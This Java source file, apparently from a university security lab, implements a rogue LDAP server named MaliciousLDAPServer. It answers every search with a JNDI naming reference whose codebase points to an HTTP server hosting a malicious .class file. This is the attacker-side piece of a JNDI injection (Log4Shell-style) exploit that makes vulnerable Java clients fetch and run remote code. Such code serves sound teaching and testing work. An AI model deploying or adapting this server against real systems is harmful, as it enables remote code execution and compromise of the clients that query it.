package ch.unige.ldap;

import java.net.URL;
import java.net.InetAddress;
import javax.net.SocketFactory;

import com.unboundid.ldap.sdk.Attribute;
import com.unboundid.ldap.sdk.Entry;
import javax.net.ServerSocketFactory;
import javax.net.ssl.SSLSocketFactory;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import com.unboundid.util.NotNull;
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchRequest;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;

/**
 * LDAP server implementation returning JNDI references
 */
public class MaliciousLDAPServer {

    private int LDAP_PORT = 1389;
    private String LDAP_BASE = "dc=unige,dc=ch";
    private String HTTP_SERVER_IP = "0.0.0.0";

    public MaliciousLDAPServer(String ldap_base, int ldap_port, String http_server_ip, int netcat_port) {
        this.LDAP_PORT = ldap_port;
        this.LDAP_BASE = ldap_base;
        this.HTTP_SERVER_IP = http_server_ip;
    }

    public void listen() {
        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(
                new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName("0.0.0.0"), 
                    this.LDAP_PORT,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault())
            );

            config.addInMemoryOperationInterceptor(new OperationInterceptor());
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + this.LDAP_PORT); //$NON-NLS-1$
            ds.startListening();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /*
     * Helper class to intercept an LDAP search query and send back an entry describing
     * a java class with an URL that points towards an HTTP server hosting a .class file. 
     * This class is registered by config.addInMemoryOperationInterceptor() to intercept
     * LDAP queries. 
     */
    private static class OperationInterceptor extends InMemoryOperationInterceptor {
        private URL codebase;                   // url of the HTTP server qthat hosts the malicious .class file, http://HTTP_SERVER_IP#Exploit
        public OperationInterceptor() {}

        public void processSearchRequest(InMemoryInterceptedSearchRequest request) {
            System.out.println("BASE DN processSearchRequest :" + request.getRequest().getBaseDN());
        }

        /** {@inheritDoc} */
        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);                                                                  // create new entry with dn

            try {                                                                       
                System.out.println("Send LDAP reference result for " + base + " java object.");
    
                e.addAttribute("javaClassName", "foo");                       // entry is a Java Class, with name Exploit
                e.addAttribute("javaCodeBase", "http://snoopy-http-server:8000/");                    // java code is hosted at http://http_server_ip:web_port/Exploit.class
                e.addAttribute("objectClass", "javaNamingReference");                      
                e.addAttribute("javaFactory", base);                     // name of malicious class : Exploit
                result.sendSearchEntry(e);
                result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    
            } catch (Exception e1) {
                e1.printStackTrace();
            }

        }
    }
}
